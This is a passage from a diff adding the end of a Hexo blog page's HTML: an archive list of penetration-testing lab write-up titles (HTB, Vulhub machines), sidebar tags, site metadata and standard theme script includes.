+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span>
+            <a class="archive-post-title" href="/2023/07/17/Vulhub/lin.security/">HTB-Labs(lin.security)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span>
+            <a class="archive-post-title" href="/2023/06/05/Three/">HTB-Labs(Three)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/02</span>
+            <a class="archive-post-title" href="/2023/06/02/Responder/">HTB-Labs(Resonder)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/24</span>
+            <a class="archive-post-title" href="/2023/05/24/Vulhub/SkyTower/">HTB-Labs(SkyTower)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/23</span>
+            <a class="archive-post-title" href="/2023/05/23/Vulhub/pWnOS%20v2.0/">HTB-Labs(pWnOS)</a>
+        </li>
+                </ul>
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/23</span>
+            <a class="archive-post-title" href="/2022/12/23/Vulhub/Kioptix%20Level%201/">HTB-Labs(Kioptix Level 1)</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="HTB">
+                <span class="iconfont-archer">&#xe606;</span>
+                HTB
+            </span>
+            <span class="sidebar-tag-name" data-tags="Lab">
+                <span class="iconfont-archer">&#xe606;</span>
+                Lab
+            </span>
+            <span class="sidebar-tag-name" data-tags="HtbStartPorint">
+                <span class="iconfont-archer">&#xe606;</span>
+                HtbStartPorint
+            </span>
+            <span class="sidebar-tag-name" data-tags="OSCP">
+                <span class="iconfont-archer">&#xe606;</span>
+                OSCP
+            </span>
+            <span class="sidebar-tag-name" data-tags="域控">
+                <span class="iconfont-archer">&#xe606;</span>
+                域控
+            </span>
+            <span class="sidebar-tag-name" data-tags="汇编">
+                <span class="iconfont-archer">&#xe606;</span>
+                汇编
+            </span>
+            <span class="sidebar-tag-name" data-tags="PWN">
+                <span class="iconfont-archer">&#xe606;</span>
+                PWN
+            </span>
+            <span class="sidebar-tag-name" data-tags="Vulhub">
+                <span class="iconfont-archer">&#xe606;</span>
+                Vulhub
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://DarkAmP.github.io",
+        root: siteMetaRoot,
+        author: "DarkAP"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
